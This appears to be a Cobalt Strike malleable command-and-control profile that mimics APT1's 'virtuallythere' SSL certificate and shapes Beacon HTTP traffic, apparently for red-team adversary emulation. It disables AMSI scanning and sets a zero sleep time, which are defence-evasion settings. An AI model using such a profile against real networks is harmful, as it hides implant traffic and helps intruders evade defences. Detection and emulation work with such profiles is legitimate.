# APT1 VIRTUALLYTHERE SSL 
#
# Reference: Mandiant's APT1 Report
#        Digital Appendx F - SSL Certificates
#            http://intelreport.mandiant.com/
#
# Author: @armitagehacker
set sample_name "crto.profile";

set sleeptime "0";        

set amsi_disable "true";

# this is the certificate
https-certificate {
    set C   "US";
    set ST  "Some-State";
    set O   "www.virtuallythere.com";
    set OU  "new";
    set CN  "new";
}

# since *cough* presumably you're using an HTTPS Beacon...
http-get {
    set uri "/get";

    client {
        metadata {
            netbiosu;
            parameter "tmp";
        }
    }

    server {
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

http-post {
    set uri "/post";

    client {
        header "Content-Type" "application/octet-stream";

        id {
            uri-append;
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "text/html";

        output {
            print;
        }
    }
}